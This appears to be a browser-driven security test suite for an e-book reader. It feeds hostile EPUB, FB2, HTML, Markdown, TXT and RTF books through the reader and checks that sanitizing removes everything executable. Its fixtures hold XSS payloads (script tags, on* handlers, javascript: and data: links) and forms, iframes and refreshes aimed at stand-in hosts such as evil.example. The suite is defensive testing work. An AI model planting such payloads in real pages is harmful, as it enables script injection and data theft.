"""A hostile book in every text format: nothing in it may run, leave the app or reach the network (owner, 2026-11-14:
«головне безпека» — a security review of every place the app puts HTML into the page).

The same set of traps goes into an EPUB (chapter, contents titles, a footnote), FB2, HTML, Markdown, TXT and RTF:
<script>, on* handlers, javascript: and data:text/html links, <iframe>/<object>/<embed>, <form>/<input>, <meta refresh>,
<base>, <svg onload>, <style> with url(), CSS url()/expression in style="", an external tracking pixel and a
protocol-relative image. For each format the check reads the rendered page itself (not only whether a script ran — the
CSP would stop a script even if the sanitizer let it through, and this suite must catch the sanitizer's own failure):
no executable element, no on* attribute, no link other than http(s)/mailto/in-book, no external image, no CSS url(),
nothing executed, no request left the app, no CSP violation.
"""
import base64, io, json, os, time, zipfile
from browser_cdp import CDP

URL = os.environ.get('READER_TEST_URL', 'http://127.0.0.1:8765/index.html')
c = CDP(); c.sock.settimeout(60)
c.call('Page.enable'); c.call('Runtime.enable'); c.call('Network.enable'); c.call('Network.setCacheDisabled', cacheDisabled=True)
c.call('Network.setBypassServiceWorker', bypass=True)   # always the code on disk, never a cached copy
c.call('Emulation.setDeviceMetricsOverride', width=1000, height=900, deviceScaleFactor=1, mobile=False)
c.call('Page.addScriptToEvaluateOnNewDocument', source="""
window.__pwned = 0; window.__csp = [];
document.addEventListener('securitypolicyviolation', e => __csp.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
""")
READY = "document.readyState==='complete' && !document.body.inert && typeof openBookFile==='function'"
c.call('Page.navigate', url=URL); c.wait(READY, timeout=30)
c.js("localStorage.setItem('reader_onboarding_done','1'); showUpdateBanner = () => {}; callAI = async () => { throw new Error('offline'); }; 1")

requests = []
def drain():   # every request the page made that did not go to the app itself (resource timing sees images, frames, fetches)
    requests[:] = [u for u in c.js("JSON.stringify(performance.getEntriesByType('resource').map(e => e.name))") and json.loads(c.js("JSON.stringify(performance.getEntriesByType('resource').map(e => e.name))"))
                   if not u.startswith(('http://127.0.0.1:8765', 'data:', 'blob:'))]


TRAPS = """<p id="t1">Hostile <b>but readable</b> text.</p>
<script>window.__pwned = 1</script>
<img src="x" onerror="window.__pwned = 2" alt="img">
<img src="https://tracker.example/pixel.gif" alt="pixel"><img src="//tracker.example/p2.gif" alt="p2">
<a id="j" href="javascript:window.__pwned=3">js link</a> <a id="d" href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">data link</a>
<a id="ok" href="https://example.org/">a real link</a>
<iframe src="https://evil.example/"></iframe><object data="https://evil.example/x"></object><embed src="https://evil.example/y">
<form action="https://evil.example/steal"><input name="pw" value="x"><button onclick="window.__pwned=4">send</button></form>
<meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">
<svg onload="window.__pwned=5"><circle r="5"/></svg>
<style>body { background: url(https://tracker.example/bg.gif) }</style>
<p style="background-image: url(https://tracker.example/s.gif); color: red; width: expression(alert(1))" onmouseover="window.__pwned=6">styled</p>
<div onclick="window.__pwned=7"><span onmouseenter="window.__pwned=8">nested</span></div>
"""

PAGE_CHECK = """(() => { const root = els.pages, all = [...root.querySelectorAll('*')];
  const bad = [];
  for (const e of all) {
    if (/^(script|iframe|object|embed|form|input|meta|base|style|link|svg|frame|frameset)$/i.test(e.localName)) bad.push('element ' + e.localName);
    for (const a of e.attributes) {
      if (/^on/i.test(a.name)) bad.push('attr ' + a.name);
      if (/url\\(|expression\\(/i.test(a.name === 'style' ? a.value : '')) bad.push('css ' + a.value);
    }
    if (e.localName === 'a' && e.hasAttribute('href') && !/^(https?:|mailto:|#book-)/i.test(e.getAttribute('href'))) bad.push('href ' + e.getAttribute('href'));
    if (e.localName === 'img' && /^(https?:)?\\/\\//i.test(e.getAttribute('src') || '')) bad.push('external img ' + e.getAttribute('src'));
  }
  return JSON.stringify({ bad, pwned: window.__pwned, text: root.textContent.includes('but readable'), real: !!root.querySelector('a[href="https://example.org/"]'), csp: __csp });
})()"""


def open_book(name, data, mime='application/octet-stream'):
    c.js("window.__ok = 0; openBookFile(new File([Uint8Array.from(atob(%s), ch => ch.charCodeAt(0))], %s, {type: %s, lastModified: %d})).then(() => { __ok = 1; }, e => { __ok = String(e); }); 1"
         % (json.dumps(base64.b64encode(data).decode()), json.dumps(name), json.dumps(mime), len(requests) + 7))
    c.wait("window.__ok !== 0", timeout=30); time.sleep(1.2)
    # None here means the page itself was replaced or broken by the book (a <meta refresh>, <base>, a script): a failure too.
    assert c.js("window.__ok") == 1, (name, c.js("window.__ok"), 'the book broke or navigated the page' if c.js("window.__ok") is None else '')


def check_page(label, expect_text=True, expect_link=True):
    # hover and click every element: an on* handler that survived would fire now
    c.js("[...els.pages.querySelectorAll('*')].forEach(e => { e.dispatchEvent(new MouseEvent('mouseover', {bubbles: true})); e.dispatchEvent(new MouseEvent('mouseenter')); }); 1")
    time.sleep(0.3); drain()
    r = json.loads(c.js(PAGE_CHECK))
    ok = not r['bad'] and r['pwned'] == 0 and (r['text'] or not expect_text) and (r['real'] or not expect_link) and not r['csp'] and not requests
    assert ok, (label, r, requests)
    print('PASS', label, flush=True)


def epub():
    o = io.BytesIO()
    with zipfile.ZipFile(o, 'w') as z:
        z.writestr('mimetype', 'application/epub+zip')
        z.writestr('META-INF/container.xml', '<container><rootfiles><rootfile full-path="OEBPS/content.opf"/></rootfiles></container>')
        z.writestr('OEBPS/content.opf', '<package><metadata><dc:language xmlns:dc="http://purl.org/dc/elements/1.1/">en</dc:language></metadata>'
                   '<manifest><item id="a" href="a.xhtml"/><item id="nav" href="nav.xhtml" properties="nav"/></manifest><spine><itemref idref="a"/></spine></package>')
        z.writestr('OEBPS/nav.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><body><nav epub:type="toc"><ol>'
                   '<li><a href="a.xhtml">Chapter &lt;img src=x onerror="window.__pwned=9"&gt;<script>window.__pwned=10</script></a></li></ol></nav></body></html>')
        z.writestr('OEBPS/a.xhtml', '<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><body>'
                   + TRAPS.replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;')
                   + '<p>See note<a id="nref" epub:type="noteref" href="#n1">1</a>.</p>'
                   + '<aside id="n1" epub:type="footnote"><p>Note <img src="x" onerror="window.__pwned=11"/><a href="javascript:window.__pwned=12">x</a></p></aside></body></html>')
    return o.getvalue()


open_book('hostile.epub', epub(), 'application/epub+zip')
check_page('EPUB: the chapter renders its text and the real link, and nothing hostile survives')
toc = c.js("JSON.stringify({ html: els.toc.innerHTML, pwned: window.__pwned })")
assert 'onerror' not in json.loads(toc)['html'].replace('&lt;', '<').split('<img')[0] or '<img' not in json.loads(toc)['html'], toc
assert '<script' not in json.loads(toc)['html'] and '<img' not in json.loads(toc)['html'] and json.loads(toc)['pwned'] == 0, toc
print('PASS EPUB: the contents titles are text (a title with markup in it shows as text, not as an element)', flush=True)
c.js("document.getElementById('book-nref')?.click(); 1"); time.sleep(1.2); drain()
note = json.loads(c.js("JSON.stringify({ shown: !!document.querySelector('#epub-note .epub-note-body'), html: document.querySelector('#epub-note .epub-note-body')?.innerHTML || '', pwned: window.__pwned })"))
assert note['shown'] and 'onerror' not in note['html'] and 'javascript:' not in note['html'] and '<img' not in note['html'] and note['pwned'] == 0, note
print('PASS EPUB: the footnote card shows the note without its image handler or javascript: link', flush=True)
c.js("window.hideEpubNote && hideEpubNote(); 1")

FB2 = ('<?xml version="1.0" encoding="utf-8"?><FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">'
       '<description><title-info><book-title>Hostile &lt;img src=x onerror="window.__pwned=13"&gt;</book-title><lang>en</lang></title-info></description>'
       '<body><section><title><p>Chapter</p></title><p id="t1">Hostile <strong>but readable</strong> text.</p>'
       '<p><a l:href="javascript:window.__pwned=14">js</a> <a l:href="https://example.org/">a real link</a></p>'
       '<p>&lt;script&gt;window.__pwned=15&lt;/script&gt;</p></section></body></FictionBook>')
open_book('hostile.fb2', FB2.encode(), 'application/x-fictionbook+xml')
check_page('FB2: text and the real link stay; the javascript: link and the escaped script stay inert')

open_book('hostile.html', ('<!doctype html><html><head><title>t</title><script>window.__pwned=16</script></head><body>' + TRAPS + '</body></html>').encode(), 'text/html')
check_page('HTML: a saved web page full of traps renders only safe content')

MD = '# Hostile\n\nHostile **but readable** text.\n\n[js link](javascript:window.__pwned=17) [a real link](https://example.org/)\n\n' + TRAPS + '\n\n![x](https://tracker.example/md.gif)\n'
open_book('hostile.md', MD.encode(), 'text/markdown')
check_page('Markdown: raw HTML inside Markdown and a javascript: link are neutralised, the external image is dropped')

open_book('hostile.txt', ('Hostile but readable text.\n' + TRAPS).encode(), 'text/plain')
r = json.loads(c.js("JSON.stringify({ els: els.pages.querySelectorAll('script, img, iframe, a, form, svg').length, shows: els.pages.textContent.includes('<script>'), pwned: window.__pwned })"))
assert r['els'] == 0 and r['shows'] and r['pwned'] == 0, r
print('PASS TXT: markup in a text file is shown as text, never parsed', flush=True)

RTF = r'{\rtf1\ansi Hostile but readable text. \par {\field{\*\fldinst HYPERLINK "javascript:window.__pwned=18"}{\fldrslt js}} \par <script>window.__pwned=19</script>\par}'
open_book('hostile.rtf', RTF.encode(), 'application/rtf')
check_page('RTF: a javascript: hyperlink field and markup text stay inert', expect_link=False)

drain()
assert c.js("window.__pwned") == 0 and not requests and not c.js("__csp.length"), (c.js("window.__pwned"), requests, c.js("JSON.stringify(__csp)"))
print('PASS nothing ran, nothing left the app, no CSP violation in the whole run', flush=True)
print('ALL HOSTILE BOOK CHECKS PASSED')
